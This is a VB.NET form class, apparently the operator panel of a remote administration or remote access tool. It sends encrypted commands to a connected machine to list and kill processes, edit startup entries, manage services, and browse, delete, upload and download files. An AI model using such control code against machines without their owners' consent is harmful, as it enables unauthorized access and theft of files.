Public Class SystemInformation
    Public connected As Connection
#Region "Main info"
    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("SystemInformation", Form1.enckey))
    End Sub
    Private Sub TreeView1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        TreeView1.SelectedNode.SelectedImageKey = TreeView1.SelectedNode.ImageKey
    End Sub
#End Region
#Region "Process"
    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetProcess", Form1.enckey))
        Catch 
        End Try
    End Sub
    Private Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        Try
            Dim items As String = Nothing
            For Each item As ListViewItem In listprocess.SelectedItems
                items += item.Text & "|"
                listprocess.Items.RemoveAt(item.Index)
            Next
            connected.Send(New Encryption().AES_Encrypt("Kill|" & items, Form1.enckey))
            Label1.Text = "Total Processes: " & listprocess.Items.Count
        Catch
        End Try
    End Sub
    Private Sub NewProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewProcessToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("New|" & InputBox("Process-name to start", "New Process"), Form1.enckey))
        Catch 
        End Try
    End Sub
#End Region
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("Software", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub SystemInformation_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RefreshToolStripMenuItem.PerformClick()
    End Sub
    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetTCPConnections", Form1.enckey))
        Catch 
        End Try
    End Sub
#Region "Startup"
    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetStartup", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            For Each item As ListViewItem In ListView_Startup.SelectedItems
                connected.Send(New Encryption().AES_Encrypt("RemovefromStartup" & item.Group.Header & "\|" & item.Text, Form1.enckey))
                ListView_Startup.Items.Remove(item)
            Next
        Catch
        End Try
    End Sub
#End Region
#Region "FileManager"
    Private Sub ComboBox1_Click(sender As Object, e As EventArgs) Handles ComboBox1.Click
        ComboBox1.Items.Clear()
        connected.Send(New Encryption().AES_Encrypt("ListDrives", Form1.enckey))
    End Sub
    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        ListView_Files.Items.Clear()
        connected.Send(New Encryption().AES_Encrypt("ListFiles" & ComboBox1.SelectedItem, Form1.enckey))
    End Sub
    Private Sub ListView_Files_Click(sender As Object, e As EventArgs) Handles ListView_Files.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                ListView_Files.ContextMenuStrip = rightclick_filemanagerfolders
            ElseIf ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "0" Then
                ListView_Files.ContextMenuStrip = rightclick_filemanagerfiles
            Else
                ListView_Files.ContextMenuStrip = rightclick_nothing
            End If
        Catch
        End Try
    End Sub
    Private Sub ListView_Files_DoubleClick(sender As Object, e As EventArgs) Handles ListView_Files.DoubleClick
        Try
            If ListView_Files.SelectedItems.Item(0).Text = "[...]" Then
                Dim i As Integer = Form1.CountCharacter(TextBox1.Text, "\")
                Dim text As String = TextBox1.Text
                Dim x As String = ComboBox1.SelectedItem & text.Replace(text.Split("\")(i - 1) & "\", "")

                ListView_Files.Items.Clear()

                connected.Send(New Encryption().AES_Encrypt("ListFiles" & x, Form1.enckey))

                ListView_Files.Items.Add("[...]", 23)
            End If

            Dim curpath As String = Form1.path & ListView_Files.SelectedItems.Item(0).Text & "\"

            ListView_Files.Items.Clear()

            connected.Send(New Encryption().AES_Encrypt("ListFiles" & curpath, Form1.enckey))

            ListView_Files.Items.Add("[...]", 23)
        Catch
        End Try
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Try
            ListView_Files.Items.Clear()
            connected.Send(New Encryption().AES_Encrypt("ListFiles" & ComboBox1.SelectedItem & TextBox1.Text, Form1.enckey))
            If Not TextBox1.Text = "" Then ListView_Files.Items.Add("[...]", 23)
        Catch
        End Try
    End Sub
    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            PictureBox2_Click(New Object(), New System.EventArgs())
        End If
    End Sub
    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        Try
            ListView_Files.Items.Clear()

            connected.Send(New Encryption().AES_Encrypt("ListFiles" & Form1.path, Form1.enckey))

            If Not TextBox1.Text = "" Then ListView_Files.Items.Add("[...]", 23)
        Catch
        End Try
    End Sub
    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        Try
            ListView_Files.Items.Clear()

            connected.Send(New Encryption().AES_Encrypt("ListFiles" & Form1.path, Form1.enckey))

            If Not TextBox1.Text = "" Then ListView_Files.Items.Add("[...]", 23)
        Catch
        End Try
    End Sub
    Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem3.Click
        Try
            ListView_Files.Items.Clear()

            connected.Send(New Encryption().AES_Encrypt("ListFiles" & Form1.path, Form1.enckey))

            If Not TextBox1.Text = "" Then ListView_Files.Items.Add("[...]", 23)

        Catch
        End Try
    End Sub
    Private Sub CreateNewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewFolderToolStripMenuItem.Click
        Try
            Dim FolderName As String = InputBox("Please specify a Name for the folder you want to create!", "New Directory")
            If FolderName = "" Then
                MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("mkdir" & Form1.path & FolderName, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub CreateNewFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewFileToolStripMenuItem.Click
        Try
            Dim FolderName As String = InputBox("Please specify a Name for the folder you want to create!", "New Directory")
            If FolderName = "" Then
                MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("mkdir" & Form1.path & FolderName, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub CreateNewFolderToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CreateNewFolderToolStripMenuItem1.Click
        Try
            Dim FolderName As String = InputBox("Please specify a Name for the folder you want to create!", "New Directory")
            If FolderName = "" Then
                MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("mkdir" & Form1.path & FolderName, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub DeleteFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFolderToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "0" Then
                MsgBox("Please select a Folder!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("rmdir" & Form1.path & ListView_Files.SelectedItems.Item(0).Text, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub RenameFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFolderToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "0" Then
                MsgBox("Please select a Folder!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Dim newname As String = InputBox("Please enter a new Name for the Directory", "Rename Folder")
            If newname = "" Then
                MsgBox("Rename failed, due empty name", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("rnfolder" & Form1.path & ListView_Files.SelectedItems.Item(0).Text & "|" & newname, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub CopyThisFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyThisFolderToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "0" Then
                MsgBox("Please select a Folder!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Form1.oldpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
            Form1.nam = ListView_Files.SelectedItems.Item(0).Text

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
            rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
            rightclick_nothing.Items.RemoveByKey("Copy3")
            rightclick_nothing.Items.RemoveByKey("Move3")

            Dim itm As New ToolStripMenuItem("Paste Folder here")
            itm.Image = My.Resources.folder__arrow
            itm.Name = "Copy1"
            rightclick_filemanagerfolders.Items.Add(itm)
            AddHandler itm.Click, AddressOf PasteHereItem_Click

            Dim itm2 As New ToolStripMenuItem("Paste Folder here")
            itm2.Image = My.Resources.folder__arrow
            itm2.Name = "Copy2"
            rightclick_filemanagerfiles.Items.Add(itm2)
            AddHandler itm2.Click, AddressOf PasteHereItem_Click

            Dim itm3 As New ToolStripMenuItem("Paste Folder here")
            itm3.Image = My.Resources.folder__arrow
            itm3.Name = "Copy3"
            rightclick_nothing.Items.Add(itm3)
            AddHandler itm3.Click, AddressOf PasteHereItem_Click

        Catch
        End Try
    End Sub
    Private Sub MoveThisFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MoveThisFolderToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "0" Then
                MsgBox("Please select a Folder!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Form1.oldpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
            Form1.nam = ListView_Files.SelectedItems.Item(0).Text

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
            rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
            rightclick_nothing.Items.RemoveByKey("Copy3")
            rightclick_nothing.Items.RemoveByKey("Move3")

            Dim itm As New ToolStripMenuItem("Move Folder here")
            itm.Image = My.Resources.folder__arrow
            itm.Name = "Move1"
            rightclick_filemanagerfolders.Items.Add(itm)
            AddHandler itm.Click, AddressOf MoveHereItem_Click

            Dim itm2 As New ToolStripMenuItem("Move Folder here")
            itm2.Image = My.Resources.folder__arrow
            itm2.Name = "Move2"
            rightclick_filemanagerfiles.Items.Add(itm2)
            AddHandler itm2.Click, AddressOf MoveHereItem_Click

            Dim itm3 As New ToolStripMenuItem("Move Folder here")
            itm3.Image = My.Resources.folder__arrow
            itm3.Name = "Move2"
            rightclick_nothing.Items.Add(itm3)
            AddHandler itm3.Click, AddressOf MoveHereItem_Click
        Catch
        End Try
    End Sub
    Sub MoveHereItem_Click()
        Try
            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            connected.Send(New Encryption().AES_Encrypt("mvdir" & Form1.oldpath & "\|" & newpath & "\|" & Form1.nam, Form1.enckey))

            rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
            rightclick_nothing.Items.RemoveByKey("Move3")
        Catch
        End Try
    End Sub
    Sub PasteHereItem_Click()
        Try
            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            connected.Send(New Encryption().AES_Encrypt("cpdir" & Form1.oldpath & "\|" & newpath & "\|" & Form1.nam, Form1.enckey))

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
            rightclick_nothing.Items.RemoveByKey("Copy3")
        Catch
        End Try
    End Sub
    Private Sub CreateNewFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CreateNewFileToolStripMenuItem1.Click
        Try
            newfile.connected = connected

            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            newfile.path = newpath

            newfile.Show()
        Catch
        End Try
    End Sub
    Private Sub CreateNewFileToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles CreateNewFileToolStripMenuItem2.Click
        Try
            newfile.connected = connected

            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            newfile.path = newpath

            newfile.Show()
        Catch
        End Try
    End Sub
    Private Sub CreateNewFileToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles CreateNewFileToolStripMenuItem3.Click
        Try
            newfile.connected = connected

            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            newfile.path = newpath

            newfile.Show()
        Catch
        End Try
    End Sub
    Private Sub DeleteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                MsgBox("Please select a File!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("rmfile" & Form1.path & ListView_Files.SelectedItems.Item(0).Text, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub RenameFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFileToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                MsgBox("Please select a File!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Dim newname As String = InputBox("Please enter a new Name for the File", "Rename File")
            If newname = "" Then
                MsgBox("Rename failed, due empty name", MsgBoxStyle.Critical)
                Exit Sub
            End If

            connected.Send(New Encryption().AES_Encrypt("rnfile" & Form1.path & ListView_Files.SelectedItems.Item(0).Text & "|" & newname, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub CopyFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyFileToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                MsgBox("Please select a File!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Form1.oldpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
            Form1.nam = ListView_Files.SelectedItems.Item(0).Text

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
            rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
            rightclick_nothing.Items.RemoveByKey("Copy3f")
            rightclick_nothing.Items.RemoveByKey("Move3f")

            Dim itm As New ToolStripMenuItem("Paste File here")
            itm.Image = My.Resources.document__arrow
            itm.Name = "Copy1f"
            rightclick_filemanagerfolders.Items.Add(itm)
            AddHandler itm.Click, AddressOf PasteFileHere

            Dim itm2 As New ToolStripMenuItem("Paste File here")
            itm2.Image = My.Resources.document__arrow
            itm2.Name = "Copy2f"
            rightclick_filemanagerfiles.Items.Add(itm2)
            AddHandler itm2.Click, AddressOf PasteFileHere

            Dim itm3 As New ToolStripMenuItem("Paste File here")
            itm3.Image = My.Resources.document__arrow
            itm3.Name = "Copy3f"
            rightclick_nothing.Items.Add(itm3)
            AddHandler itm3.Click, AddressOf PasteFileHere
        Catch
        End Try
    End Sub
    Private Sub MoveFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MoveFileToolStripMenuItem.Click
        Try
            If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                MsgBox("Please select a File!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Form1.oldpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text
            Form1.nam = ListView_Files.SelectedItems.Item(0).Text

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
            rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
            rightclick_nothing.Items.RemoveByKey("Copy3f")
            rightclick_nothing.Items.RemoveByKey("Move3f")

            Dim itm As New ToolStripMenuItem("Move File here")
            itm.Image = My.Resources.document__arrow
            itm.Name = "Move1f"
            rightclick_filemanagerfolders.Items.Add(itm)
            AddHandler itm.Click, AddressOf MoveFileHere

            Dim itm2 As New ToolStripMenuItem("Move File here")
            itm2.Image = My.Resources.document__arrow
            itm2.Name = "Move2f"
            rightclick_filemanagerfiles.Items.Add(itm2)
            AddHandler itm2.Click, AddressOf MoveFileHere

            Dim itm3 As New ToolStripMenuItem("Move File here")
            itm3.Image = My.Resources.document__arrow
            itm3.Name = "Move2f"
            rightclick_nothing.Items.Add(itm3)
            AddHandler itm3.Click, AddressOf MoveFileHere
        Catch
        End Try
    End Sub
    Sub PasteFileHere()
        Try
            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text + "\"
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            connected.Send(New Encryption().AES_Encrypt("copyfile" & Form1.oldpath & "|" & newpath & "|" & Form1.nam, Form1.enckey))

            rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
            rightclick_nothing.Items.RemoveByKey("Copy3f")
        Catch
        End Try
    End Sub
    Sub MoveFileHere()
        Try
            Dim newpath As String
            Try
                If ListView_Files.SelectedItems.Item(0).SubItems(4).Text = "1" Then
                    newpath = Form1.path & ListView_Files.SelectedItems.Item(0).Text + "\"
                Else
                    newpath = Form1.path
                End If
            Catch
                newpath = Form1.path
            End Try

            connected.Send(New Encryption().AES_Encrypt("movefile" & Form1.oldpath & "|" & newpath & "|" & Form1.nam, Form1.enckey))

            rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
            rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
            rightclick_nothing.Items.RemoveByKey("Move3f")
        Catch
        End Try
    End Sub
    Private Sub DownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileToolStripMenuItem.Click
        Try
            Form1.filename = ListView_Files.SelectedItems.Item(0).Text
            connected.Send(New Encryption().AES_Encrypt("sharefile" & Form1.path & Form1.filename, Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub UploadFileToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem2.Click
        Try
            Dim ofd As New OpenFileDialog
            With ofd
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop).ToString
                .Multiselect = False
                .Title = "Select a File to upload!"
            End With
            Dim res = ofd.ShowDialog()
            If res = Windows.Forms.DialogResult.OK Then
                connected.Send(New Encryption().AES_Encrypt("FileUpload" & Form1.path & ListView_Files.SelectedItems.Item(0).Text & "\" & ofd.FileName.Split("\")(Form1.CountCharacter(ofd.FileName, "\")), Form1.enckey))
            Else
            End If
        Catch
        End Try
    End Sub
    Private Sub UploadFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem1.Click
        Try
            Dim ofd As New OpenFileDialog
            With ofd
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop).ToString
                .Multiselect = False
                .Title = "Select a File to upload!"
            End With
            Dim res = ofd.ShowDialog()
            If res = Windows.Forms.DialogResult.OK Then
                connected.Send(New Encryption().AES_Encrypt("FileUpload" & Form1.path & ofd.FileName.Split("\")(Form1.CountCharacter(ofd.FileName, "\")), Form1.enckey))
            Else
            End If
        Catch
        End Try
    End Sub
    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click
       Try
            Dim ofd As New OpenFileDialog
            With ofd
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop).ToString
                .Multiselect = False
                .Title = "Select a File to upload!"
            End With
            Dim res = ofd.ShowDialog()
            If res = Windows.Forms.DialogResult.OK Then
                connected.Send(New Encryption().AES_Encrypt("FileUpload" & Form1.path & "|" & ofd.FileName.Split("\")(Form1.CountCharacter(ofd.FileName, "\") & "|" & New Encryption().EncryptBase64(IO.File.ReadAllBytes(ofd.FileName))), Form1.enckey))
            Else
            End If
        Catch
        End Try
    End Sub
#End Region
#Region "Services"
    Private Sub RefreshToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem4.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("GetServices", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ServiceAction" & ListView_Service.SelectedItems.Item(0).Index & "|" & "Close", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub ContinueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContinueToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ServiceAction" & ListView_Service.SelectedItems.Item(0).Index & "|" & "Continue", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ServiceAction" & ListView_Service.SelectedItems.Item(0).Index & "|" & "Pause", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ServiceAction" & ListView_Service.SelectedItems.Item(0).Index & "|" & "Start", Form1.enckey))
        Catch
        End Try
    End Sub
    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("ServiceAction" & ListView_Service.SelectedItems.Item(0).Index & "|" & "Stop", Form1.enckey))
        Catch
        End Try
    End Sub
#End Region
End Class